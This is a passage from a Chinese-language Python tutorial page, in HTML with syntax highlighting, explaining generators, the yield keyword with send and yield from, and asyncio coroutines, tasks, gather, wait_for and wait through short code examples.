class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ok&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(iterable_list))<br>    <span class="hljs-keyword">except</span> StopIteration:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;empty&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><p><strong>生成器（generator）</strong>是一种特殊的迭代器，它并不会像迭代器一样占用大量内存。合理使用生成器，可以降低内存占用、优化程序结构、提高程序速度。此外，在 Python 2 的版本中，生成器也是实现l协程的一种重要方式。</p><p><strong>示例：生成器与迭代器的性能差异比较</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> psutil<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_memory</span>(<span class="hljs-params">hint</span>):</span><br>    memory = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;psutil.Process(os.getpid()).memory_full_info().uss / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span>:<span class="hljs-number">.4</span>f&#125;</span> MB&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;hint&#125;</span> memory used: <span class="hljs-subst">&#123;memory&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_iterator</span>():</span><br>    show_memory(<span class="hljs-string">&#x27;init iterator&#x27;</span>)<br>    res = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50000000</span>)]  <span class="hljs-comment"># 返回迭代器，其中的每个元素在生成后都会保存到内存中</span><br>    show_memory(<span class="hljs-string">&#x27;after initiated&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;sum result: <span class="hljs-subst">&#123;<span class="hljs-built_in">sum</span>(res)&#125;</span>&#x27;</span>)<br>    show_memory(<span class="hljs-string">&#x27;after sum called&#x27;</span>)<br>    <span class="hljs-built_in">print</span>()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_generator</span>():</span><br>    show_memory(<span class="hljs-string">&#x27;init generator&#x27;</span>)<br>    res = (i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50000000</span>))  <span class="hljs-comment"># 返回生成器，只有在调用next()函数的时候，才会生成下一个变量</span><br>    show_memory(<span class="hljs-string">&#x27;after initiated&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;sum result: <span class="hljs-subst">&#123;<span class="hljs-built_in">sum</span>(res)&#125;</span>&#x27;</span>)<br>    show_memory(<span class="hljs-string">&#x27;after sum called&#x27;</span>)<br>    <span class="hljs-built_in">print</span>()<br><br><br>test_iterator()<br>test_generator()<br></code></pre></td></tr></table></figure><h2 id="yield-关键字"><a href="#yield-关键字" class="headerlink" title="yield 关键字"></a>yield 关键字</h2><blockquote><p>yield 应当取其“让步”而非“产出”或“返回”之意，这是理解协程的关键。</p></blockquote><p>yield 有让步之意，因为它交出了程序的控制权，但这个协程并没有结束，下一次执行时，将恢复到之前让出程序控制权的地方，也就是 yield 语句执行的地方继续执行。方法中包含<code>yield</code>表达式后，Python 会将其视作一个生成器对象，不再是普通的方法。</p><p>常用方法说明：</p><ul><li><code>__next__()</code>方法或<code>next()</code>: 作用是启动或者恢复 generator 的执行，相当于<code>send(None)</code></li><li><code>send(value)</code>方法：作用是发送值给 yield 表达式，启动 generator 会调用<code>send (None)</code></li><li>使用生成器之前需要先调用<code>__next__</code>或者<code>send(None)</code>方法，否则将报错。</li></ul><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><p><strong>示例一：yield 的简单使用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;generator start&#x27;</span>)<br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        yield_expression_value = <span class="hljs-keyword">yield</span> n<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;yield_expression_value: <span class="hljs-subst">&#123;yield_expression_value&#125;</span>&#x27;</span>)<br>        n += <span class="hljs-number">1</span>  <span class="hljs-comment"># 创建generator对象</span><br><br><br>test_generator = test()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(test_generator))  <span class="hljs-comment"># &lt;class &#x27;generator&#x27;&gt;</span><br><span class="hljs-comment"># 启动generator</span><br>next_result = <span class="hljs-built_in">next</span>(test_generator)  <span class="hljs-comment"># generator start</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;next_result: <span class="hljs-subst">&#123;next_result&#125;</span>&#x27;</span>)  <span class="hljs-comment"># 1</span><br><span class="hljs-comment"># 发送值给yield表达式</span><br>send_result = test_generator.send(<span class="hljs-number">100</span>)  <span class="hljs-comment"># 100</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;send_result: <span class="hljs-subst">&#123;send_result&#125;</span>&#x27;</span>)  <span class="hljs-comment"># 2</span><br><span class="hljs-comment"># 再次调用generator</span><br>send_result = <span class="hljs-built_in">next</span>(test_generator)  <span class="hljs-comment"># None</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;send_result: <span class="hljs-subst">&#123;send_result&#125;</span>&#x27;</span>)  <span class="hljs-comment"># 3</span><br></code></pre></td></tr></table></figure><p><strong>示例二：yield 和 send 与外界的交互流程</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">jump_range</span>(<span class="hljs-params">up_to</span>):</span><br>    step = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> step &lt; up_to:<br>        jump = <span class="hljs-keyword">yield</span> step<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;jump&#x27;</span>, jump)<br>        <span class="hljs-keyword">if</span> jump <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            jump = <span class="hljs-number">1</span><br>        step += jump<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;step&#x27;</span>, step)<br><br><br>iterator = jump_range(<span class="hljs-number">10</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(iterator))  <span class="hljs-comment"># 0</span><br><span class="hljs-built_in">print</span>(iterator.send(<span class="hljs-number">4</span>))  <span class="hljs-comment"># jump 4; step 4; 4</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(iterator))  <span class="hljs-comment"># jump None; step 5; 5</span><br><span class="hljs-built_in">print</span>(iterator.send(-<span class="hljs-number">1</span>))  <span class="hljs-comment"># jump -1; step 4; 4</span><br></code></pre></td></tr></table></figure><p><strong>示例三：yield 生产者-消费者模型</strong></p><p>传统的生产者-消费者模型是一个线程写消息，一个线程读消息，通过锁机制控制队列和等待，但一不小心就可能死锁。如果改用协程，生产者生产消息后，直接通过 <code>yield</code> 跳转到消费者开始执行，待消费者执行完毕后，切换回生产者继续生产，效率极高。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;示例说明：</span><br><span class="hljs-string">1. consumer函数是一个generator</span><br><span class="hljs-string">2. 把一个consumer传入produce后，首先调用c.send(None)启动生成器</span><br><span class="hljs-string">3. 一旦produce产生了消息，通过c.send(n)切换到consumer执行</span><br><span class="hljs-string">4. consumer通过yield拿到消息，进行处理，又通过yield把结果传回</span><br><span class="hljs-string">5. produce拿到consumer处理的结果，继续生产下一条消息</span><br><span class="hljs-string">6. produce决定不生产了，通过c.close()关闭consumer，整个过程结束</span><br><span class="hljs-string">7. 整个流程无锁，由一个线程执行，produce和consumer协作完成任务，所以称为“协程”，而非线程的抢占式多任务</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>():</span><br>    r = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        n = <span class="hljs-keyword">yield</span> r<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> n:<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[CONSUMER] Consuming <span class="hljs-subst">&#123;n&#125;</span>...&#x27;</span>)<br>        r = <span class="hljs-string">&#x27;200 OK&#x27;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">produce</span>(<span class="hljs-params">c</span>):</span><br>    c.send(<span class="hljs-literal">None</span>)<br>    n = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> n &lt; <span class="hljs-number">5</span>:<br>        n = n + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[PRODUCER] Producing <span class="hljs-subst">&#123;n&#125;</span>...&#x27;</span>)<br>        r = c.send(n)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[PRODUCER] Consumer return: <span class="hljs-subst">&#123;r&#125;</span>&#x27;</span>)<br>    c.close()<br><br><br>C = consumer()<br>produce(C)<br></code></pre></td></tr></table></figure><p><strong>示例四：yield from 表达式</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 子生成器</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_n</span>(<span class="hljs-params">n</span>):</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i &lt; n:<br>        <span class="hljs-keyword">yield</span> i<br>        i += <span class="hljs-number">1</span><br><br><br><span class="hljs-comment"># 委派生成器</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;start&#x27;</span>)<br>    <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> gen_n(n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;do something&#x27;</span>)<br>    <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> gen_n(n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;end&#x27;</span>)<br><br><br><span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> main(<span class="hljs-number">3</span>):<br>    <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h2 id="asyncio-库"><a href="#asyncio-库" class="headerlink" title="asyncio 库"></a><a href="https://docs.python.org/zh-cn/3/library/asyncio.html">asyncio 库</a></h2><p>asyncio 是用来编写 <strong>并发</strong> 代码的库，使用 <strong>async/await</strong> 语法，是实现高性能 Python 异步框架的基础。</p><h3 id="协程与任务"><a href="#协程与任务" class="headerlink" title="协程与任务"></a><a href="https://docs.python.org/zh-cn/3/library/asyncio-task.html">协程与任务</a></h3><h4 id="可等待对象"><a href="#可等待对象" class="headerlink" title="可等待对象"></a>可等待对象</h4><p>如果一个对象可以在 <strong>await 语句</strong> 中使用，那么它就是 <strong>可等待对象（awaitable）</strong> 。</p><blockquote><p>对 await 关键字的理解：简单的说，await就是挂起当前任务，去执行其他任务，此时是堵塞的，必须要等其他任务执行完毕才能返回到当前任务继续往下执行，这样的说的前提是，在一个时间循环中有多个 task 或 future，当 await 右面等待的对象是协程对象时，就没有了并发的作用，就是堵塞等待这个协程对象完成。</p></blockquote><p>可等待对象有三种主要类型：<strong>协程（Coroutine）</strong>、<strong>任务（Task）</strong>、<strong>Future 对象</strong>。</p><ol><li><p>协程：Python 协程属于 <em>可等待</em> 对象，因此可以在其他协程中被等待。协程函数的调用不会立即执行，而是会返回一个协程对象。协程对象需要注册到事件循环中，由事件循环调用。</p><blockquote><p>协程函数：定义形式为 <code>async def</code> 的函数<br>协程对象：调用协程函数所返回的对象</p></blockquote></li><li><p>任务：<em>任务</em> 是对协程的进一步封装，其中包含有各种状态，用于 <strong>并发</strong> 运行多个协程。当一个协程通过 <code>asyncio.create_task()</code> 等函数被封装为一个 <em>任务</em>，<strong>该协程会被自动调度执行</strong>。</p></li><li><p>Future 对象：<em>Future</em> 是一种特殊的 <strong>低层级</strong> 可等待对象，是 <em>Task</em> 的父类，表示一个异步操作的 <strong>最终结果</strong>。通常情况下 <strong>没有必要</strong> 在应用层级的代码中创建 Future 对象。</p></li></ol><p><img src="/img/Python/v2-243e068bad56486f3ada2c2b75603570_720w.jpg"></p><h4 id="运行-asyncio-程序"><a href="#运行-asyncio-程序" class="headerlink" title="运行 asyncio 程序"></a>运行 asyncio 程序</h4><ul><li><code>asyncio.run(main, *, debug=False)</code><ul><li>创建一个新的事件循环并在结束时将循环关闭。</li><li>它应当被用作 asyncio 程序 <strong>最高层级的</strong> 入口点（main 方法），在理想情况下应当只被调用一次。</li><li>当有其他 asyncio 事件循环在同一线程中运行时，此函数不能被调用。</li><li>如果 <em>debug</em> 为 <code>True</code>，事件循环将以调试模式运行。</li></ul></li></ul><p>注：<code>asyncio.run()</code> 是 Python 3.7 中引入的，也是官方 <strong>推荐的</strong> 运行协程的方式，相当于老版本的以下语句：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">loop = asyncio.get_event_loop()<br><span class="hljs-keyword">try</span>:    <br>    loop.run_until_complete(coro)<br><span class="hljs-keyword">finally</span>:    <br>    loop.close()<br></code></pre></td></tr></table></figure><h4 id="创建任务"><a href="#创建任务" class="headerlink" title="创建任务"></a>创建任务</h4><ul><li><code>asyncio.create_task(coro, *, name=None)</code><ul><li>将传入的协程封装为一个 Task，并自动调度它执行，返回 Task 对象。</li><li>当 <em>name</em> 不为 <code>None</code> 时，它将使用 <code>Task.set_name()</code> 来设置任务的名称。</li></ul></li></ul><p>同样，此函数在 Python 3.7 中被引入，相当于低层级的 <code>asyncio.ensure_future()</code> 方法。</p><h4 id="休眠"><a href="#休眠" class="headerlink" title="休眠"></a>休眠</h4><ul><li><code>asyncio.sleep(delay, result=None, *)</code><ul><li>阻塞 <em>delay</em> 指定的秒数。</li><li>如果指定了 <em>result</em>，则当协程完成时将其返回给调用者。</li><li><code>asyncio.sleep()</code> 总是会挂起当前任务，以允许其他任务运行。</li><li>将 delay 设为 0 将提供一个经优化的路径以允许其他任务运行，这可供长期间运行的函数使用以避免在函数调用的全过程中阻塞事件循环。</li></ul></li></ul><h4 id="并发运行任务"><a href="#并发运行任务" class="headerlink" title="并发运行任务"></a>并发运行任务</h4><ul><li><code>asyncio.gather(*aws, return_exceptions=False)</code><ul><li><em>并发</em> 运行 <em>aws</em> 序列中的所有可等待对象。</li><li>如果 <em>aws</em> 中的某个可等待对象为协程，它将自动被作为一个任务调度。</li><li>如果所有可等待对象都成功完成，结果将是一个由所有返回值聚合而成的列表。结果值的顺序与 <em>aws</em> 中可等待对象的顺序一致。</li><li>如果 <em>return_exceptions</em> 为 <code>False</code>，不捕获协程中的异常，错误会完整地 throw 到当前的执行层，但是 <em>aws</em> 序列中的其他可等待对象 <strong>不会被取消</strong> 并将继续运行（可以在下次 await 的时候执行）。</li><li>如果 <em>return_exceptions</em> 为 <code>True</code>，异常会和成功的结果一样处理，并聚合至结果列表。</li></ul></li></ul><p><strong>示例一：协程的异常处理和取消</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">worker_1</span>():</span><br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">worker_2</span>():</span><br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> / <span class="hljs-number">0</span>  <span class="hljs-comment"># 发生异常</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">worker_3</span>():</span><br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">3</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    task_1 = asyncio.create_task(worker_1())<br>    task_2 = asyncio.create_task(worker_2())<br>    task_3 = asyncio.create_task(worker_3())<br><br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">2</span>)<br>    task_3.cancel()  <span class="hljs-comment"># 取消任务</span><br><br>    res = <span class="hljs-keyword">await</span> asyncio.gather(task_1, task_2, task_3, return_exceptions=<span class="hljs-literal">True</span>)<br>    <span class="hljs-built_in">print</span>(res)  <span class="hljs-comment"># 输出所有task的执行结果（包括返回值、程序异常）</span><br><br><br>ts = time.time()<br>asyncio.run(main())  <span class="hljs-comment"># [1, ZeroDivisionError(&#x27;division by zero&#x27;), 3]</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;all time: &#123;:.2f&#125;s&#x27;</span>.<span class="hljs-built_in">format</span>(time.time() - ts))  <span class="hljs-comment"># 2.02s</span><br></code></pre></td></tr></table></figure><p><strong>示例二：协程的并发分组运行</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">coro</span>(<span class="hljs-params">tag</span>):</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&gt;&quot;</span>, tag)<br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;&quot;</span>, tag)<br>    <span class="hljs-keyword">return</span> tag<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    group1 = asyncio.gather(*[coro(<span class="hljs-string">&#x27;group 1.&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>)])  <span class="hljs-comment"># 对任务进行高级别分组</span><br>    group2 = asyncio.gather(*[coro(<span class="hljs-string">&#x27;group 2.&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>)])<br>    group3 = asyncio.gather(*[coro(<span class="hljs-string">&#x27;group 3.&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)])<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;start&#x27;</span>)<br>    group3.cancel()  <span class="hljs-comment"># 分组的任务可以通过调用Task.cancel()来取消</span><br>    results = <span class="hljs-keyword">await</span> asyncio.gather(group1, group2, group3, return_exceptions=<span class="hljs-literal">True</span>)<br>    <span class="hljs-built_in">print</span>(results)<br><br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure><h4 id="单任务等待"><a href="#单任务等待" class="headerlink" title="单任务等待"></a>单任务等待</h4><ul><li><code>asyncio.wait_for(aw, timeout, *)</code><ul><li>等待 <em>aw</em> 可等待对象完成，在指定 timeout 秒数后超时。</li><li>如果 <em>aw</em> 是一个协程，它将自动被作为任务调度。</li><li>如果 <em>timeout</em> 为 <code>None</code>，则等待直到完成。</li><li>如果发生超时，任务将取消并引发 <code>asyncio.TimeoutError</code>。</li><li>要避免任务取消，可以加上 <code>asyncio.shield()</code>。</li></ul></li></ul><p><strong>示例：单任务超时取消</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">eternity</span>():</span><br>    <span class="hljs-comment"># Sleep for one hour</span><br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">3600</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hi&#x27;</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-comment"># Wait for at most 1 second</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">await</span> asyncio.wait_for(eternity(), timeout=<span class="hljs-number">1.0</span>)<br>    <span class="hljs-keyword">except</span> asyncio.TimeoutError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;timeout&#x27;</span>)<br><br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure><h4 id="多任务等待"><a href="#多任务等待" class="headerlink" title="多任务等待"></a>多任务等待</h4><ul><li><p><code>asyncio.wait(aws, *, timeout=None, return_when=ALL_COMPLETED)</code></p><ul><li><p>并发地运行 <em>aws</em>  可迭代对象中的所有可等待对象，并进入阻塞状态直到满足 <em>return_when</em> 所指定的条件。</p></li><li><p>返回两个 Task/Future 集合：<code>(done, pending)</code>。</p></li><li><p>此函数不会引发 <code>asyncio.TimeoutError</code>，当超时发生时，未完成的 Task/Future 将在指定秒数后被返回。</p></li><li><p><em>return_when</em> 指定此函数应在何时返回，它必须为以下常数之一：</p><table><thead><tr><th align="left">常数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>FIRST_COMPLETED</code></td><td align="left">函数将在任意可等待对象结束或取消时返回</td></tr><tr><td align="left"><code>FIRST_EXCEPTION</code></td><td align="left">函数将在任意可等待对象因引发异常而结束时返回，当没有引发任何异常时它就相当于 <code>ALL_COMPLETED</code></td></tr><tr><td align="left"><code>ALL_COMPLETED</code></td><td align="left">函数将在 <strong>所有</strong> 可等待对象结束或取消时返回</td></tr></tbody></table></li><li><p>与 <code>wait_for()</code> 不同，<code>wait()</code> 在超时发生时不会取消可等待对象。</p></li></ul></li></ul><p><strong>示例：多任务超时取消</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">foo</span>():</span><br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">42</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bar</span>():</span><br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">3600</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">21</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    t1 = asyncio.create_task(foo())<br>    t2 = asyncio.create_task(bar())<br><br>    done, pending = <span class="hljs-keyword">await</span> asyncio.wait([t1, t2], timeout=<span class="hljs-number">2.0</span>)<br><br>    <span class="hljs-keyword">if</span> t1 <span class="hljs-keyword">in</span> done:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;The task&#x27;s result is <span class="hljs-subst">&#123;t1.result()&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;The task&#x27;s status is <span 